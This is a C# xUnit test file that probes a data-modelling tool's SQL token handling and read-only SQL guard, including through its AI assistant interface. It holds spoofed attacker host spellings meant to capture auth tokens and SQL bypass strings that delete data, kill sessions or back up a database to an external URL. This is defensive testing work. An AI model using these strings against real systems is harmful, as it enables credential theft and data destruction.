using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Semanticus.Engine;
using Xunit;

namespace Semanticus.Tests
{
    /// <summary>tc2-sql-token verifier probes. Host spellings, guard bypasses, and the token sites outside check SQL.</summary>
    [Collection("restore-root")]
    public sealed class Tc2SqlTokenAttackTests : GateFixtureBase
    {
        private const string SavedHost = "contoso-sql.database.windows.net";
        private readonly string _safeConnections;
        private readonly List<string> _tokenCalls = new List<string>();
        private readonly List<string> _sqlServers = new List<string>();

        public Tc2SqlTokenAttackTests(RestoreRootFixture fixture) : base(fixture)
        {
            _safeConnections = fixture.Root;
            ConnectionRegistry.RootOverride = Path.Combine(Root, "registry");
        }

        public override void Dispose()
        {
            ConnectionRegistry.RootOverride = _safeConnections;
            base.Dispose();
        }

        private async Task<LocalEngine> SavedModelAsync(string name)
        {
            var dir = Path.Combine(Root, name);
            Directory.CreateDirectory(dir);
            var engine = new LocalEngine(new SessionManager(), TestEntitlements.Pro);
            await engine.CreateModelAsync(name, 1604);
            await engine.CreateTableAsync("Sales", "human");
            await engine.CreateColumnAsync("Sales", "Region", "string", null, "human");
            await engine.CreateMeasureAsync("Sales", "Total Rows", "COUNTROWS('Sales')", "human");
            await engine.SaveAsync(dir, "TMDL", false, "human");
            Seams(engine);
            engine.ReconcileSqlForTests = (server, db, sql) => { lock (_sqlServers) _sqlServers.Add(server); return Value(15.0); };
            engine.SetLiveConnectionForTest(LiveConnection.ForTest("xmla", "powerbi://example/ws", name, q => Value(15.0)));
            return engine;
        }

        private void Seams(LocalEngine engine) =>
            engine.SqlTokenFetchForTests = (mode, tenant, origin) => { lock (_tokenCalls) _tokenCalls.Add(origin); return "token"; };

        private static ResultSet Value(object v) => new ResultSet
        {
            Columns = new[] { new ColumnDef { Name = "[v]" } }, Rows = new[] { new object[] { v } }, RowCount = 1,
        };

        private static TestDefinition Def(string server) => new TestDefinition
        {
            Kind = TestKinds.MeasureReconcile, Title = "Total", TargetRef = "measure:Sales/Total Rows",
            ParamsJson = TestSuiteStore.Serialize(new ReconcileRequest
            {
                MeasureRef = "Total Rows", Server = server, Database = "Db", BlankPolicy = "zero", Sql = "SELECT total",
            }),
        };

        // ---- bar 1: host spellings ----------------------------------------------------------------------------------

        [Theory]
        [InlineData("ATTACKER.EXAMPLE.NET")]
        [InlineData("attacker.example.net.")]
        [InlineData("attacker.example.net,1433")]
        [InlineData("tcp:attacker.example.net,1433")]
        [InlineData("contoso-sql.database.windows.net.attacker.net")]
        [InlineData("attacker.example.net\\contoso-sql.database.windows.net")]
        [InlineData(" TCP : contoso-sql.database.windows.net")]
        [InlineData("contoso-sql.database.windows.net-attacker.net")]
        // "xcontoso-sql.database.windows.net" left this list: it is a Microsoft host by suffix, and a check on one needs no saved source (see SqlTokenSitesTests).
        public async Task An_unsaved_host_spelling_mints_nothing_on_every_check_path(string server)
        {
            using var engine = await SavedModelAsync("Spell" + Math.Abs(server.GetHashCode()));
            SqlSourceRegistry.Save(null, "Contoso", SavedHost, "Db", "azcli", null);
            await engine.SaveTestDefinitionAsync(Def(server), "human");

            var tried = await engine.TryTestAsync(Def(server), "human");
            var run = await engine.RunTestSuiteAsync(sections: new[] { "measures" });
            var replay = await engine.RunTestSuiteAsync(false, "workflow");
            var agentRun = await engine.RunTestSuiteAsync(sections: new[] { "measures" }, origin: "agent");
            var direct = await engine.ReconcileMeasureAsync(TestSuiteStore.Deserialize<ReconcileRequest>(Def(server).ParamsJson), "agent");

            Assert.NotNull(tried.UnsavedServer);
            Assert.All(run.Reconciles.Where(o => o.DefId != null && !o.DefId.StartsWith("unmapped:")), o => Assert.NotNull(o.UnsavedServer));
            Assert.NotNull(direct.UnsavedServer);
            Assert.Empty(_tokenCalls);
            Assert.Empty(_sqlServers);
        }

        [Theory]
        [InlineData("CONTOSO-SQL.database.windows.net.")]
        [InlineData("tcp:contoso-sql.database.windows.net,1433")]
        public async Task A_saved_host_in_another_spelling_still_runs(string server)
        {
            using var engine = await SavedModelAsync("Ok" + Math.Abs(server.GetHashCode()));
            SqlSourceRegistry.Save(null, "Contoso", SavedHost, "Db", "azcli", null);
            var tried = await engine.TryTestAsync(Def(server), "human");
            Assert.Null(tried.UnsavedServer);
            Assert.NotEmpty(_sqlServers);
        }

        // ---- bar 3: guard bypass probes --------------------------------------------------------------------------

        [Theory]
        // T-SQL lexes a number glued to a keyword as two tokens ("SELECT 1FROM t" runs), and needs no semicolon between statements.
        [InlineData("SELECT 1UPDATE dbo.Sales SET Amount = 0")]
        [InlineData("SELECT 1DELETE FROM dbo.Sales")]
        // Statements whose verb is not in the list, with no semicolon.
        [InlineData("SELECT 1 DECLARE @p binary(16) SELECT @p = TEXTPTR(Notes) FROM dbo.T WRITETEXT dbo.T.Notes @p 'x'")]
        [InlineData("SELECT 1 DBCC CHECKIDENT('dbo.Sales', RESEED, 0)")]
        [InlineData("SELECT 1 RECEIVE TOP(1) * FROM dbo.Queue")]
        [InlineData("SELECT 1 KILL 55")]
        [InlineData("SELECT 1 BACKUP DATABASE Db TO URL = 'https://x.blob.core.windows.net/c/db.bak'")]
        // A line comment ended by a bare carriage return.
        [InlineData("SELECT 1 -- note\rDELETE FROM dbo.Sales")]
        public void Guard_bypass_probe(string sql)
        {
            Assert.Equal("This check's SQL changes data, so Semanticus will not run it. A check can only read.", SqlReadOnlyGuard.Refusal(sql));
        }

        [Theory]
        [InlineData("SELECT [EXEC sp_who] FROM t")]
        [InlineData("SELECT 'a; DROP TABLE t' AS v")]
        [InlineData("SELECT 1 /* ; DELETE */ AS v")]
        public void Guard_quoted_forms_are_reads(string sql) => Assert.Null(SqlReadOnlyGuard.Refusal(sql));

        // ---- bar 4: the assistant's save of a host that differs only by a suffix ---------------------------------

        [Fact]
        public async Task An_assistants_save_of_a_suffixed_host_asks()
        {
            var (engine, _, _) = await OpenAsync("suffix");
            using (engine)
            {
                await engine.SaveSqlSourceAsync(null, "Mine", SavedHost, "Db", "azcli", null, "human");
                var door = AssistantEngine.ForAssistant(engine);
                await RefusedAsync(() => door.SaveSqlSourceAsync(null, "S", SavedHost + ".attacker.net", "Db", "azcli", null, "agent"));
                Assert.Single(SqlSourceRegistry.List());
            }
        }

        // ---- question 5: the token sites outside check SQL, through the assistant's door, default preset --------

        private const string Partition = "let Source = Sql.Database(\"attacker.invalid\", \"Db\"), Returns = Source{[Schema=\"dbo\",Item=\"Returns\"]}[Data] in Returns";

        [Fact]
        public async Task Site_update_schema_assistant_get_source_schema_mints_for_a_partition_host()
        {
            var (engine, _, _) = await OpenAsync("schema");
            using (engine)
            {
                await engine.CreateImportTableAsync("Returns", Partition, "human");
                Seams(engine);
                var door = AssistantEngine.ForAssistant(engine);
                Assert.Equal("standard", AgentPolicyStore.Get().Preset);
                await door.GetSourceSchemaAsync("table:Returns", null, null, "agent");
                Assert.Empty(await engine.ListPendingApprovalsAsync());
                Assert.Empty(_tokenCalls);   // FAILS today: a token is minted for attacker.invalid with no question
            }
        }

        [Fact]
        public async Task Site_update_schema_assistant_diff_schema_mints_for_a_partition_host()
        {
            var (engine, _, _) = await OpenAsync("diff");
            using (engine)
            {
                await engine.CreateImportTableAsync("Returns", Partition, "human");
                Seams(engine);
                var door = AssistantEngine.ForAssistant(engine);
                await door.DiffSchemaAsync("table:Returns", null, null, null, "agent");
                Assert.Empty(_tokenCalls);
            }
        }

        [Fact]
        public async Task Site_spec_from_fabric_assistant_mints_for_its_own_host()
        {
            var (engine, _, _) = await OpenAsync("spec");
            using (engine)
            {
                Seams(engine);
                var door = AssistantEngine.ForAssistant(engine);
                try { await door.AutogenerateSpecFromFabricAsync("attacker.invalid", "Db", null, "import", "agent"); } catch (InvalidOperationException) { }
                Assert.Empty(await engine.ListPendingApprovalsAsync());
                Assert.Empty(_tokenCalls);
            }
        }

        [Fact]
        public async Task Site_start_plan_assistant_mints_for_its_own_host()
        {
            var (engine, _, _) = await OpenAsync("start");
            using (engine)
            {
                Seams(engine);
                var door = AssistantEngine.ForAssistant(engine);
                var folder = Path.Combine(Root, "newmodel");
                try
                {
                    await door.StartModelFromSqlAsync(new Semanticus.Engine.StartPlan.StartModelRequest
                    {
                        Server = "attacker.invalid", Database = "Db", Folder = folder, Name = "Fresh", AuthMode = "azcli",
                    }, "agent");
                }
                catch (InvalidOperationException) { }
                Assert.Empty(await engine.ListPendingApprovalsAsync());
                Assert.Empty(_tokenCalls);
            }
        }
    }
}
